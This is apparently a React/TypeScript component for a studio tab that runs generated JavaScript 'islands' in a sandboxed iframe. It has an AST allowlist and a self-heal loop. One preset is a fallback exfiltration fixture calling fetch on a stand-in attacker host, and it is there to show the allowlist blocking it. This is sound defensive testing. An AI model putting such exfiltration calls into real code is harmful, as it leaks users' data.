"use client";

/**
 * code-sandbox-island.tsx — /studio "Code-Island" tab (Phase 20 SPIKE).
 *
 * Demonstrates jailed-eval arbitrary-code rendering: pick a preset (or edit code) and Run it in
 * a sandboxed opaque-origin iframe driven by the validate→autofix→run→heal→fallback loop.
 * Presets prove each path: the curveball widget (impossible in the declarative catalog), a
 * broken island that self-heals, an unrepairable island that falls back, and an adversarial
 * island that the allowlist blocks before execution.
 *
 * SEAM (full phase): live intent → code generation via Bedrock (GenuiCodeGeneratorAdapter +
 * POST /v1/genui/code-island/generate + tRPC genui.codeIsland.generate). The spike is
 * paste/fixture-driven and requires no backend, so the sandbox + repair loop are proven offline.
 *
 * Security: the HOST does no eval/Function/dangerouslySetInnerHTML — execution is jailed to the
 * iframe; dangerous code is rejected by the AST allowlist first.
 */

import React, { useCallback, useMemo, useState } from "react";
import dynamic from "next/dynamic";
import { Play } from "lucide-react";

import { Button } from "@nauta/ui/button";
import { Textarea } from "@nauta/ui/textarea";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@nauta/ui/select";

import {
  ADVERSARIAL_FIXTURES,
  BROKEN_ISLAND_CODE,
  CURVEBALL_SOUNDSCAPE_CODE,
  UNREPAIRABLE_ISLAND_CODE,
  failingHealer,
  stubHealer,
  type IslandHealer,
} from "@nauta/genui/sandbox";

const CodeIslandFrame = dynamic(
  () => import("./code-island-frame").then((m) => ({ default: m.CodeIslandFrame })),
  {
    ssr: false,
    loading: () => (
      <div className="text-sm text-muted-foreground">Loading sandboxed runtime…</div>
    ),
  },
);

interface Preset {
  readonly id: string;
  readonly label: string;
  readonly code: string;
  readonly heal?: IslandHealer;
}

const FETCH_EXFIL =
  ADVERSARIAL_FIXTURES.find((f) => f.name === "fetch-exfil")?.code ??
  "fetch('https://evil.example');";

const PRESETS: readonly Preset[] = [
  { id: "curveball", label: "Curveball — soundscape mixer (canvas)", code: CURVEBALL_SOUNDSCAPE_CODE },
  { id: "broken", label: "Broken → self-heals", code: BROKEN_ISLAND_CODE, heal: stubHealer },
  { id: "unrepairable", label: "Unrepairable → safe fallback", code: UNREPAIRABLE_ISLAND_CODE, heal: failingHealer },
  { id: "adversarial", label: "Adversarial (fetch exfil) → blocked", code: FETCH_EXFIL },
];

export function CodeSandboxIsland(): React.ReactElement {
  const [presetId, setPresetId] = useState<string>(PRESETS[0]!.id);
  const [code, setCode] = useState<string>(PRESETS[0]!.code);
  const [runId, setRunId] = useState<number>(0);
  const [active, setActive] = useState<{ code: string; heal?: IslandHealer } | null>(null);

  const currentPreset = useMemo(
    () => PRESETS.find((p) => p.id === presetId) ?? PRESETS[0]!,
    [presetId],
  );

  const handlePreset = useCallback((value: string): void => {
    const preset = PRESETS.find((p) => p.id === value) ?? PRESETS[0]!;
    setPresetId(preset.id);
    setCode(preset.code);
  }, []);

  const handleRun = useCallback((): void => {
    setActive({ code, heal: currentPreset.heal });
    setRunId((n) => n + 1);
  }, [code, currentPreset]);

  return (
    <div className="flex flex-col gap-4 p-4">
      <div className="rounded-md border border-border/60 bg-muted/30 px-3 py-2 text-xs text-muted-foreground">
        <strong className="text-foreground">Jailed-eval SPIKE.</strong> Code runs in a sandboxed
        opaque-origin iframe (no host DOM/cookies/storage; network blocked by CSP). An AST
        allowlist rejects dangerous APIs before execution; a v0-style repair loop self-heals
        runtime errors (≤2 attempts) then falls back to a safe placeholder. Live intent → code
        generation via Bedrock is the full-phase seam.
      </div>

      <div className="flex flex-wrap items-end gap-3">
        <label className="flex flex-col gap-1 text-sm">
          <span className="text-muted-foreground">Preset</span>
          <Select value={presetId} onValueChange={handlePreset}>
            <SelectTrigger className="w-72" aria-label="Code-island preset">
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              {PRESETS.map((p) => (
                <SelectItem key={p.id} value={p.id}>
                  {p.label}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </label>
        <Button onClick={handleRun} className="gap-1">
          <Play className="size-4" aria-hidden />
          Run in sandbox
        </Button>
      </div>

      <label className="flex flex-col gap-1 text-sm">
        <span className="text-muted-foreground">Island code (editable — plain JS, runs against a fresh document)</span>
        <Textarea
          value={code}
          onChange={(e) => setCode(e.target.value)}
          spellCheck={false}
          aria-label="Island code"
          className="h-48 font-mono text-xs"
        />
      </label>

      {active ? (
        <CodeIslandFrame key={runId} code={active.code} heal={active.heal} />
      ) : (
        <div className="text-sm text-muted-foreground">
          Pick a preset and press <span className="font-medium">Run in sandbox</span>.
        </div>
      )}
    </div>
  );
}
